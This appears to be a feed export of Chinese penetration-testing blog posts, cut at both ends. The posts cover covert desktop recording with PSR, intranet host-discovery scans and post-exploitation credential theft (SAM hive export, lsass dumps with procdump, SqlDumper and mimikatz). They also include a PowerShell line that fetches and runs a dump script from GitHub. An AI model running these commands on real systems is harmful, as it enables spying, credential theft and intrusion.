[/arcmht (0|1)]</span><br><span class="line">[/stopevent &lt;eventname&gt;] [/maxlogsize &lt;value&gt;] [/recordpid &lt;pid&gt;]</span><br><span class="line"></span><br><span class="line">/start 开始录制，需要指定文件保存路径</span><br><span class="line">/stop 停止录制 </span><br><span class="line">/sc 捕捉记录步骤的截图，0|1</span><br><span class="line">/maxsc 最大的截图数量</span><br><span class="line">/maxlogsize 最大日志文件大小(MB)</span><br><span class="line">/gui 是否显示psr的界面，0|1 </span><br><span class="line">/arcetl Include raw ETW file in archive output.</span><br><span class="line">/arcxml Include MHT file in archive output.</span><br><span class="line">/recordpid Record all actions associated with given PID.</span><br><span class="line">/sketch Sketch UI if no screenshot was saved.</span><br><span class="line">/slides Create slide show HTML pages.</span><br><span class="line">/output 保存的输出路径</span><br><span class="line">/stopevent Event to signal after output files are generated.</span><br></pre></td></tr></table></figure></p><p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">psr.exe /start /gui 0 /output C:\windows\temp\capture.zip</span><br><span class="line">后台启动psr并开始录制，文件保存为C:\windows\temp\capture.zip</span><br><span class="line">Start-Sleep -s 10;</span><br><span class="line">等待10s，即录制时间为10s</span><br><span class="line">psr.exe /stop;</span><br><span class="line">结束录制，自动退出</span><br></pre></td></tr></table></figure></p><p>压缩包内是mht格式,直接用IE打开就好。效果为：<br><img src="/image/巧妙利用win自带的-PSR-实现监控Windows桌面/PSR.PNG" alt=""></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p><img src="/image/巧妙利用win自带的-PSR-实现监控Windows桌面/Turn off Problem Steps Recorder.PNG" alt="Turn off Problem Steps Recorder"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>利用PSR监控Windows桌面，不仅仅能够捕获用户桌面的操作，而且在报告中会包含更多有用的细节信息，相信你在渗透测试的过程中，bat+定时任务，一定会用上它。</p><p>【参考】<br><a href="http://cb.drops.wiki/drops/tips-13125.html" target="_blank" rel="noopener">渗透技巧——如何巧妙利用PSR监控Windows桌面</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PSR 即win自带的”问题步骤记录器”,也就是说它会捕捉活动窗口。这还是在课上无聊翻到的一个东西，用在屏幕截图上也是有很好的效果，因为是Windows系统自带的，所以不用考虑免杀问题。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透技巧" scheme="https://rcoil.me/tags/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>内网存活扫描</title>
    <link href="https://rcoil.me/2017/08/%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E6%89%AB%E6%8F%8F/"/>
    <id>https://rcoil.me/2017/08/内网存活扫描/</id>
    <published>2017-08-05T07:18:43.000Z</published>
    <updated>2018-11-16T02:49:41.133Z</updated>
    
    <content type="html"><![CDATA[<p>咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。<br><a id="more"></a></p><h2 id="icmp扫描"><a href="#icmp扫描" class="headerlink" title="icmp扫描"></a>icmp扫描</h2><p>基于icmp的各种内网主机发现方式，如果防火墙过滤的icmp请求，这种方式基本就废了，但是基本上都不会过滤icmp协议的请求。除了本身自带的命令，也可以考虑使用第三方程序，比如<code>cping</code>。</p><h3 id="在win下使用icmp扫描"><a href="#在win下使用icmp扫描" class="headerlink" title="在win下使用icmp扫描"></a>在win下使用icmp扫描</h3><ul><li><p>cmd中执行如下命令，对整个C段进行ping扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i &quot;ttl&quot;</span><br></pre></td></tr></table></figure></li><li><p>利用powershell对目标内网进行icmp扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot;  </span><br><span class="line"></span><br><span class="line">目标网段，并非仅限C段，比如你也可以写成这种方式`192.168.3.1 - 192.168.31.254`</span><br></pre></td></tr></table></figure></li></ul><h3 id="在linux下使用各类icmp扫描"><a href="#在linux下使用各类icmp扫描" class="headerlink" title="在linux下使用各类icmp扫描"></a>在linux下使用各类icmp扫描</h3><ul><li><p>最简单的方式,将下面的代码保存至shell中,赋予其执行权限,执行该脚本即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> 192.168.1.&#123;1..254&#125; </span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">ping <span class="variable">$ip</span> -c 1 &amp;&gt; /dev/null </span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$ip</span> is alive .... </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 192.168.4.&#123;1..254&#125;; <span class="keyword">do</span> <span class="keyword">if</span> ping -c 3 -w 3 <span class="variable">$i</span> &amp;&gt;/dev/null; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="variable">$i</span> is alived; <span class="keyword">fi</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li><li><p>nmap的icmp扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE 192.168.1.0/24</span><br></pre></td></tr></table></figure></li></ul><h2 id="arp扫描"><a href="#arp扫描" class="headerlink" title="arp扫描"></a>arp扫描</h2><h3 id="在win下使用各种arp扫描"><a href="#在win下使用各种arp扫描" class="headerlink" title="在win下使用各种arp扫描"></a>在win下使用各种arp扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start /b arpscan.exe -t 192.168.1.0/24 &gt;&gt; result.txt</span><br><span class="line"></span><br><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;  &gt;&gt; result.txt</span><br></pre></td></tr></table></figure><h3 id="在-linux-下使用-arp-扫描"><a href="#在-linux-下使用-arp-扫描" class="headerlink" title="在 linux 下使用 arp 扫描"></a>在 linux 下使用 arp 扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># wget https://nmap.org/dist/nmap-7.40.tar.bz2</span><br><span class="line"># bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -</span><br><span class="line"># cd nmap-7.40 </span><br><span class="line"># ./configure  这里可以用--prefix指定安装路径</span><br><span class="line"># echo $?</span><br><span class="line"># make</span><br><span class="line"># make install</span><br><span class="line"># echo $?</span><br><span class="line"># make install</span><br><span class="line"># echo $?</span><br><span class="line"># nmap -sn -PR 192.168.1.0/24  尝试arp扫描</span><br></pre></td></tr></table></figure><ul><li><p>处在别人的vpn内网(kali)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.0/24 -i eth0</span><br><span class="line"></span><br><span class="line">msf的arp扫描模块</span><br><span class="line"></span><br><span class="line">msf &gt; use  auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set  interface eth0</span><br><span class="line">msf &gt; set  smac 00:0c:29:92:fd:85</span><br><span class="line">msf &gt; set  rhosts 192.168.1.0/24</span><br><span class="line">msf &gt; set  threads 20</span><br><span class="line">msf &gt; set  shost 192.168.1.27</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure></li><li><p>meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem 另外,在目标机器上扫描时,务必先提权(个人建议,会方便很多),不然扫描过程中可能会有些问题</span><br><span class="line">meterpreter &gt; run autoroute -s 192.168.1.0/24</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24</span><br></pre></td></tr></table></figure></li></ul><h2 id="基于smb和netbios的内网主机发现方式"><a href="#基于smb和netbios的内网主机发现方式" class="headerlink" title="基于smb和netbios的内网主机发现方式"></a>基于smb和netbios的内网主机发现方式</h2><h3 id="win下"><a href="#win下" class="headerlink" title="win下:"></a>win下:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe -m  192.168.1.0/24   非常经典的小工具</span><br></pre></td></tr></table></figure><p>linux下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz</span><br><span class="line">tar -zxvf nbtscan-source-1.0.35.tgz</span><br><span class="line">make</span><br><span class="line">echo $?</span><br><span class="line">./nbtscan -h</span><br><span class="line">./nbtscan -m 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><h2 id="域内扫描"><a href="#域内扫描" class="headerlink" title="域内扫描"></a>域内扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br><span class="line">dsquery computer  其实,域内最好用的也就是nbtscan了</span><br></pre></td></tr></table></figure><p>Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal ENABLEDELAYEDEXPANSION</span><br><span class="line">@FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO (</span><br><span class="line">@FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO (</span><br><span class="line">@FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k  %%j)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;咦！使人觉得遥远的不是时间长，而是两三件不可挽回的事。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="系统安全,内网" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透归纳（持续更新）</title>
    <link href="https://rcoil.me/2017/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://rcoil.me/2017/06/内网渗透/</id>
    <published>2017-06-25T13:29:11.000Z</published>
    <updated>2018-12-21T09:21:09.800Z</updated>
    
    <content type="html"><![CDATA[<p>内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。<br>标：本文多数内容是整合的知识点。<br><a id="more"></a></p><hr><h1 id="0x00-前期基本信息探测"><a href="#0x00-前期基本信息探测" class="headerlink" title="0x00 前期基本信息探测"></a>0x00 前期基本信息探测</h1><p>尽可能详细得分析出网段信息、各部门ip段、重点找出IT运维部、OA、邮箱服务器、人力资源管理等。<br>最后画一张组织结构图，这样在内网定位的时候，无论是针对内网查找资料还是针对特殊任务都是非常实用的一项技术。<br>不过信息收集，不是一天两天就能完成的事情，这种事情要持之以恒。</p><h2 id="一、人事组织结构图"><a href="#一、人事组织结构图" class="headerlink" title="一、人事组织结构图"></a>一、人事组织结构图</h2><p>demo:<br><img src="/image/内网渗透/blog_2018-11-16_10-47-14.png" alt="安创科技"></p><p>思路：这种人事图，除了在外部站点上有，也可以到首页去查找<code>关于我们</code>，有一些简单的说明，然后再去招聘网找各式的岗位名称，最后连蒙带猜（没有这样的操作），收集尽量精确能到各个人员。当然，想要详细，就得通过不同的渠道获取。</p><h2 id="二、ip分布"><a href="#二、ip分布" class="headerlink" title="二、ip分布"></a>二、ip分布</h2><p>思路：</p><ol><li>一般大公司有内部门户系统，可通过内部门户系统公开链接找出部门ip段（如果找到路由也很惊喜）；</li><li>内网中可通过路由器、交换机等设备命令执行、snmp、弱口令获取网络拓扑；</li><li>DNS域传送信息泄漏；</li></ol><hr><h1 id="0x01-切入点（起点）"><a href="#0x01-切入点（起点）" class="headerlink" title="0x01 切入点（起点）"></a>0x01 切入点（起点）</h1><p><img src="/image/内网渗透/切入点.png" alt="切入点.png"></p><ol><li>Web门户系统getshell –&gt; system权限；</li><li>邮件服务器；</li><li>邮件服务器获取信息中得出VPN账密和IP地址；</li><li>路由器建立VPN进入；</li><li>社工上线；</li><li>待更新…</li></ol><hr><h1 id="0x02-靶机信息收集"><a href="#0x02-靶机信息收集" class="headerlink" title="0x02 靶机信息收集"></a>0x02 靶机信息收集</h1><p>主要针对三种：</p><ol><li>基于命令形式的，包括权限信息，机器信息，进程端口，网络连接，共享、会话等等；</li><li>基于应用与文件形式的，例如一些敏感文件，密码文件，浏览器，远程连接客户端等；</li><li>还有一种是最直接的，例如抓取本地明文与hash，键盘记录，屏幕记录等。</li></ol><p>网上已经有大量相关的资源与文章了，这里就不再占篇幅了，只说点额外的不常见技巧。</p><h2 id="一、命令行形式"><a href="#一、命令行形式" class="headerlink" title="一、命令行形式"></a>一、命令行形式</h2><p>包括但不限于一下几点</p><h3 id="（一）常用命令"><a href="#（一）常用命令" class="headerlink" title="（一）常用命令"></a>（一）常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hostname #主机名</span><br><span class="line">systeminfo #系统信息（所在域，开机时间，安装信息，补丁情况，系统版本）</span><br><span class="line">set #环境变量</span><br><span class="line">net user #查看默认用户</span><br><span class="line">net view #显示当前域或工作组中计算机的列表</span><br><span class="line">net localgroup #查看用户组</span><br><span class="line">net localgroup Administrators #查看Administrators组所有用户(包括隐藏用户)</span><br><span class="line">query user #查看当前会话（window7 64以上）</span><br><span class="line">tasklist /v #显示当前进程和进程用户</span><br><span class="line">net config workstation #查看当前登陆用户信息</span><br><span class="line">net statistics workstation #查看主机开机时间</span><br><span class="line">net share #查看共享文件夹</span><br></pre></td></tr></table></figure><h3 id="（二）不常用命令"><a href="#（二）不常用命令" class="headerlink" title="（二）不常用命令"></a>（二）不常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whoami /all   查看Mandatory Label看我们是否过uac</span><br><span class="line">net session    查看有没有远程连过来的session</span><br><span class="line">cmdkey /l     看是否保存了登陆凭证.（凭据管理器）</span><br><span class="line">echo %logonserver%  查看登陆域</span><br><span class="line">net stitastics server  查看登陆时间</span><br><span class="line">Wmic  能让攻击者大量利用来获取系统信息的系统自带工具</span><br><span class="line">wmic qfe list #获取补丁信息</span><br><span class="line">Netsh  做端口转发</span><br><span class="line">spn –l administrator 域内查某个用户spn记录</span><br><span class="line">dsquery | nltest  域内信息收集</span><br></pre></td></tr></table></figure><h2 id="二、应用与文件形式"><a href="#二、应用与文件形式" class="headerlink" title="二、应用与文件形式"></a>二、应用与文件形式</h2><p>虽然标题不错，但是内容只是去翻文件，包括一些应用的配置文件，密码文件等。<br>有时候会碰到一些加密的office办公软件，例如word,excel 这些。</p><blockquote><p>如果是低版本如2003的话，攻击者会在百度搜一些网上的破解软件进行破解（会联网）。<br>如果是高版本的话，往往在目标用户开着文件时使用微软SysinternalsSuite套装中的procdump将内存dump回去，用内存查看器直接查看文件内容。</p></blockquote><p>因此就算有些敏感文件加密了照样能够被攻击者获取敏感信息。</p><h2 id="三、hash和明文"><a href="#三、hash和明文" class="headerlink" title="三、hash和明文"></a>三、hash和明文</h2><p>这一步使用mimikatz基本就足够了，也分exe、dll与ps三个版本，分情况使用，但免杀是个问题。</p><h3 id="（一）从-sam-中提取目标系统本地用户密码-hash"><a href="#（一）从-sam-中提取目标系统本地用户密码-hash" class="headerlink" title="（一）从 sam 中提取目标系统本地用户密码 hash"></a>（一）从 sam 中提取目标系统本地用户密码 hash</h3><p>使用<code>reg</code>将<code>sam</code>、<code>system</code>和<code>security</code>文件导出来，并拖回本地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># &gt;cd Desktop</span><br><span class="line"></span><br><span class="line"># Desktop&gt;reg save HKLM\SYSTEM system.hiv</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line"># Desktop&gt;reg save HKLM\SAM sam.hiv</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line"># Desktop&gt;reg save HKLM\SECURITY sercrity.hiv</span><br><span class="line">The operation completed successfully.</span><br></pre></td></tr></table></figure><p>PS：本地复原机器与目标机器务必一致。复原结果：</p><p><img src="/image/内网渗透/mimikatz_sam.png" alt="mimikatz_sam.png"></p><p>这个方法在某些情况下有奇效。</p><h3 id="（二）通过-dump-lsass-exe-进程数据离线免杀抓明文的各种方式"><a href="#（二）通过-dump-lsass-exe-进程数据离线免杀抓明文的各种方式" class="headerlink" title="（二）通过 dump lsass.exe 进程数据离线免杀抓明文的各种方式"></a>（二）通过 dump lsass.exe 进程数据离线免杀抓明文的各种方式</h3><h4 id="1、procdump-exe"><a href="#1、procdump-exe" class="headerlink" title="1、procdump.exe"></a>1、procdump.exe</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp //For 32 bits</span><br><span class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp //For 64 bits</span><br></pre></td></tr></table></figure><p>本地还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h4 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Public&gt;powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1');"Get-Process lsass | Out-Minidump"</span></span><br><span class="line">或者本机执行</span><br><span class="line"><span class="comment"># Public&gt;powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\Users\Public\Out-Minidump.ps1'; Get-Process lsass | Out-Minidump&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/image/内网渗透/powershell_lsass.png" alt="mimikatz_sam.png"></p><p>PS：<code>Out-Minidump.ps1</code>有C# 版本<a href="https://github.com/GhostPack/SharpDump" target="_blank" rel="noopener">SharpDump</a>。</p><h4 id="3、SqlDumper"><a href="#3、SqlDumper" class="headerlink" title="3、SqlDumper"></a>3、SqlDumper</h4><p>如果目标系统上安装了<code>Windows SQL Server</code>，<code>SqlDumper.exe</code>默认存放在c:\Program Files\Microsoft SQL Server\number\Shared，其中number代表sql server的版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">140 for SQL Server 2017</span><br><span class="line">130 for SQL Server 2016</span><br><span class="line">120 for SQL Server 2014</span><br><span class="line">110 for SQL Server 2012</span><br><span class="line">100 for SQL Server 2008</span><br><span class="line">90 for SQL Server 2005</span><br></pre></td></tr></table></figure><p>当然，如果没有安装有<code>Windows SQL Server</code>的话，可以自己上传一个<code>SqlDumper.exe</code></p><p>上去。</p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Public&gt;tasklist /svc |findstr lsass.exe&quot;</span><br><span class="line">lsass.exe                      512 SamSs</span><br><span class="line"></span><br><span class="line">c:\Users\Public&gt;SqlDumper-2016.exe 512 0 0x01100</span><br><span class="line">Parsed parameters:</span><br><span class="line">    ProcessID = 512</span><br><span class="line">    ThreadId = 0</span><br><span class="line">    Flags = 0x120</span><br><span class="line">    MiniDumpFlags = 0x1966</span><br><span class="line">    SqlInfoPtr = 0x0000000000000000</span><br><span class="line">    DumpDir = &lt;NULL&gt;</span><br><span class="line">    ExceptionRecordPtr = 0x0000000000000000</span><br><span class="line">    ContextPtr = 0x0000000000000000</span><br><span class="line">    ExtraFile = &lt;NULL&gt;</span><br><span class="line">    PatternForExtraFiles = &lt;NULL&gt;</span><br><span class="line">    InstanceName = &lt;NULL&gt;</span><br><span class="line">    ServiceName = &lt;NULL&gt;</span><br><span class="line">Remote process didn&apos;t specify a dump file name</span><br><span class="line">Target suspended</span><br><span class="line">Callback type 11 not used</span><br><span class="line">Callback type 15 not used</span><br><span class="line">Callback type 7 not used</span><br><span class="line">MiniDump completed: SQLDmpr0001.mdmp</span><br><span class="line">Total Buffer pool data pages filtered out: 0 KB</span><br><span class="line">Total Hekaton data pages filtered out: 0 KB</span><br><span class="line">Total Free memory (from non top level allocators) filtered out: 0 KB</span><br><span class="line">Total top level free memory filtered out: 0 KB</span><br><span class="line">Total Log pool memory filtered out: 0 KB</span><br><span class="line">Location of module &apos;dbghelp.dll&apos; : &apos;C:\Windows\system32\dbghelp.dll&apos;</span><br><span class="line">File version of module &apos;C:\Windows\system32\dbghelp.dll&apos; : &apos;6.1:7601.17514&apos;</span><br><span class="line">Product version of module &apos;C:\Windows\system32\dbghelp.dll&apos; : &apos;6.1:7601.17514&apos;</span><br><span class="line">GetModuleHandle () Failed 0x7e - The specified module could not be found.</span><br><span class="line"></span><br><span class="line">Watson Invoke: No</span><br></pre></td></tr></table></figure><h3 id="（三）关于-windows-10-2012r2-以后系统的明文密码抓取方式"><a href="#（三）关于-windows-10-2012r2-以后系统的明文密码抓取方式" class="headerlink" title="（三）关于 windows 10 / 2012r2 以后系统的明文密码抓取方式"></a>（三）关于 windows 10 / 2012r2 以后系统的明文密码抓取方式</h3><p>在<code>windows 10 / 2012</code>之后的系统版本中，默认情况下是禁用了在内存缓存中存储系统用户明文密码。此时使用mimikatz去抓取密码，会显示null。</p><p>解决办法为：修改注册表–&gt; <a href="http://www.ansbase5.info/?p=136" target="_blank" rel="noopener">抓取windows server 2012 &amp; 2016 &amp; win8明文密码</a>。</p><h1 id="0x03-网络环境的判断"><a href="#0x03-网络环境的判断" class="headerlink" title="0x03 网络环境的判断"></a>0x03 网络环境的判断</h1><ol><li>机器所处位置区域的判断;</li><li>机器角色的判断;</li><li>进出口流量是否连通的判断，是否出的去，进的来。</li></ol><h2 id="一、位置的判断"><a href="#一、位置的判断" class="headerlink" title="一、位置的判断"></a>一、位置的判断</h2><p>位置判断是指机器处于网络拓扑中的某个区域，是在DMZ区，办公网，还是核心区，核心DB等多个位置，当然这里的区域并不是绝对的，只是大概的一个环境，不同的地方网络环境不一样，区域的界限也不一定明显。</p><h2 id="二、角色的判断"><a href="#二、角色的判断" class="headerlink" title="二、角色的判断"></a>二、角色的判断</h2><p>机器角色的判断指判断已经控制的机器是普通Web服务器、开发测试服务器、公共服务器、文件服务器还是代理服务器、DNS服务器、存储服务器等等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况进行综合判断的。</p><h2 id="三、连通性的判断"><a href="#三、连通性的判断" class="headerlink" title="三、连通性的判断"></a>三、连通性的判断</h2><p>出口流量是否连通的判断指机器是否能上外网这些，要综合判断协议（tcp\http\dns\icmp等协议）与端口(常见能出去的端口有80,8080,443,53,110,123等)。在这里还有一种是网络内网设置了代理服务器的情况，攻击者通常会查看环境变量set，主机名是否有proxy字样的机器，注册表是否有写明代理地址或指定pac代理文件等。</p><hr><h1 id="0x04-横向渗透"><a href="#0x04-横向渗透" class="headerlink" title="0x04 横向渗透"></a>0x04 横向渗透</h1><p>如果是workgroup横向，攻击者会尝试web漏洞挖掘、密码猜解、嗅探等，方法不是特别的多。<br>如果是domain横向，方法就比较多了，在workgroup横向多了例如AD2008 gpp 、ms14-068 、kerberoast 和配置错误等。</p><h2 id="一、默认权限配置认知"><a href="#一、默认权限配置认知" class="headerlink" title="一、默认权限配置认知"></a>一、默认权限配置认知</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]普通机器</span><br><span class="line">允许Console：administrator组（domain admins），users组（domain users），backup operators组</span><br><span class="line">允许rdp：administrator组（domain admins），Remote desktop users组</span><br><span class="line"></span><br><span class="line">[+]域控AD</span><br><span class="line">允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组</span><br><span class="line">允许rdp：administrator组，Remote desktop users组</span><br></pre></td></tr></table></figure><p>如果出现配置错误，那就是权限配置问题。</p><p>tips：当某些<code>普通\不普通用户</code>加入AD的rdp组或其他管理员组，当攻击者拿到这些用户的权限时就相当于可以获取到域控制器的权限了。</p><h2 id="二、代理转发"><a href="#二、代理转发" class="headerlink" title="二、代理转发"></a>二、代理转发</h2><p><a href="http://rcoil.me/2017/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87/">渗透测试-之-代理篇</a></p><h2 id="三、工作组横向"><a href="#三、工作组横向" class="headerlink" title="三、工作组横向"></a>三、工作组横向</h2><p>工作组横向的方法、花样要比域环境少得多。 </p><p>工作组一般都是个人机和少数服务器。通常使用的方法有：</p><ul><li>扫描网段中的web服务，个人机可能会存在一些默认的基础环境，供个人测试使用。比如：<code>phpStudy</code>、<code>AppServ</code>、<code>XAMPP</code>，这些基本都是默认配置；</li><li>MS17-010，补丁号为<code>KB4013389</code>；</li><li>hash抓取 –&gt; 